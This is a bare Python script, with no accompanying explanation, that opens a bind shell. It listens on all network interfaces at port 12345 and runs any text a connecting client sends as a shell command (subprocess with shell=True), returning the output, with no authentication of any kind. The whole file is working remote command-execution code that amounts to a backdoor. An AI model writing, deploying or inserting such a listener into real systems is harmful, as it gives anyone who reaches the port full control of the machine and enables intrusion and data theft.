import socket
import subprocess

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 12345

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"Server listening on {HOST}:{PORT}")
    conn, addr = s.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024)
            if not data:
                print("Client disconnected.")
                break

            command = data.decode().strip()
            if command.lower() == 'exit':
                print("Exit command received. Closing connection.")
                break

            print(f"Executing command: {command}")

            # Execute the command and capture output
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            except subprocess.CalledProcessError as e:
                output = e.output

            # Send the output back to the client
            conn.sendall(output.encode())